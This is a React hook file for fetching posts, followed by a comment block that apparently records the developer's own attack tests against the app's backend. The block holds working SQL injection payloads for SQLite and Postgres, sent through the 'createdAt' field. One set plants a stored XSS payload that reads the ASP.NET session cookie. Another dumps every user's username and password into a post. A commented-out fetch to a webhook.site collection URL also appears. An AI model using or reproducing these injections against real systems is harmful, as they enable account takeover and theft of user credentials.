import React, {useCallback} from "react";
import {useFetchErrorWrapper} from "./useFetchErrorWrapper";
import {baseUrl} from "../api-base-url";
// fetch("https://webhook.site/2a31afb2-3a5e-449c-abdb-ab8919ea55b4", {body: "test123", method: "POST"})


export const usePosts = () => {
    const fetchCall = useCallback(
        (fetch) => fetch(`${baseUrl}/api/posts`, {
            credentials: "include"
        }),
        []
    );

    return useFetchErrorWrapper(fetchCall, []);
}

/* XSS :)
Sqlite
{
   "content":"asd",
   "createdAt":"2022-03-28T20:16:45.583Z' WHERE Id=1; UPDATE Posts SET CreatedAt='2022-03-28T20:16:45.583Z', Content='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
}
Postgres
{
   "content":"asd",
   "createdAt":"2022-03-28T20:16:45.583Z' WHERE \"Id\"=1; UPDATE public.\"Posts\" SET \"CreatedAt\"='2022-03-28T20:16:45.583Z', \"Content\"='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
}
Resulting Raw Postgres Query
UPDATE public."Posts"
	SET "Content"='asd', "CreatedAt"='2022-03-28T20:16:45.583Z' WHERE "Id"=1; UPDATE public."Posts" SET "CreatedAt"='2022-03-28T20:16:45.583Z', "Content"='<p>tzttttt</p><img src="https://www.erorerer123.com/a.jpg" onerror="cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})" />'
	WHERE "Id"=1;


GET All users in post Raw Postgres 
UPDATE public."Posts"
SET "Content" = t.creds
FROM (
	SELECT array_to_string(array_agg(distinct "creds"),';') AS creds
	FROM (
		SELECT 'same' as same,
		concat("UserName",':',"Password") as creds
		FROM public."AppUser"
		GROUP BY creds
		) t JOIN public."AppUser" ON 'same' = t.same
	GROUP BY "same"
)t
WHERE public."Posts"."Id"=22

GET All users in post
{
   "content":"asd",
   "createdAt":"2022-03-28T20:16:45.583Z' WHERE \"Id\"=1; UPDATE public.\"Posts\" SET \"Content\" = t.creds FROM (SELECT array_to_string(array_agg(distinct \"creds\"),';') AS creds FROM (SELECT 'same' as same, concat(\"UserName\",':',\"Password\") as creds FROM public.\"AppUser\" GROUP BY creds) t JOIN public.\"AppUser\" ON 'same' = t.same GROUP BY \"same\")t JOIN public.\"AppUser\" ON 'x' = 'x"
}

* */